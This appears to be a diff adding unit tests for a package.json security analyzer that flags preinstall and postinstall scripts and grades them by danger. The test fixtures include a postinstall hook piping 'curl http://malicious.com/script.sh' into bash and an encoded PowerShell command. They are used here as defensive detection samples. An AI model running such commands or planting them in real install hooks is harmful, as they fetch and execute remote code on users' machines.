@@ -52,6 +52,44 @@ suite('PackageJsonAnalyzer', () => {
             assert.strictEqual(findings.length, 0)
         })
 
+        test('detects postinstall script with high priority for dangerous command', () => {
+            const json = {
+                scripts: {
+                    postinstall: 'curl http://malicious.com/script.sh | bash'
+                }
+            }
+            const findings = analyzer.checkPackageJson(JSON.stringify(json), fakeUri)
+            assert.strictEqual(findings.length, 1)
+            assert.strictEqual(findings[0].type, FindingType.InstallScript)
+            assert.ok(findings[0].name.includes('postinstall'))
+            assert.strictEqual(findings[0].priority, 'high')
+        })
+
+        test('detects postinstall script with medium priority for non-dangerous command', () => {
+            const json = {
+                scripts: {
+                    postinstall: 'echo done'
+                }
+            }
+            const findings = analyzer.checkPackageJson(JSON.stringify(json), fakeUri)
+            assert.strictEqual(findings.length, 1)
+            assert.strictEqual(findings[0].type, FindingType.InstallScript)
+            assert.strictEqual(findings[0].priority, 'medium')
+        })
+
+        test('detects both preinstall and postinstall scripts', () => {
+            const json = {
+                scripts: {
+                    preinstall: 'echo pre',
+                    postinstall: 'echo post'
+                }
+            }
+            const findings = analyzer.checkPackageJson(JSON.stringify(json), fakeUri)
+            assert.strictEqual(findings.length, 2)
+            assert.ok(findings.some(f => f.type === FindingType.PreinstallScript))
+            assert.ok(findings.some(f => f.type === FindingType.InstallScript))
+        })
+
         test('detects preinstall script with high priority for dangerous command', () => {
             const json = {
                 scripts: {
@@ -111,6 +149,18 @@ suite('PackageJsonAnalyzer', () => {
             const findings = await analyzer.checkFile(fakeUri, content)
             assert.strictEqual(findings.length, 1)
             assert.strictEqual(findings[0].type, FindingType.PreinstallScript)
+            assert.strictEqual(findings[0].priority, 'high')
+        })
+
+        test('parses content and detects postinstall', async () => {
+            const content = new TextEncoder().encode(JSON.stringify({
+                scripts: {
+                    postinstall: 'powershell -EncodedCommand abc123'
+                }
+            }))
+            const findings = await analyzer.checkFile(fakeUri, content)
+            assert.strictEqual(findings.length, 1)
+            assert.strictEqual(findings[0].type, FindingType.InstallScript)
             assert.strictEqual(findings[0].priority, 'high')
         })
 
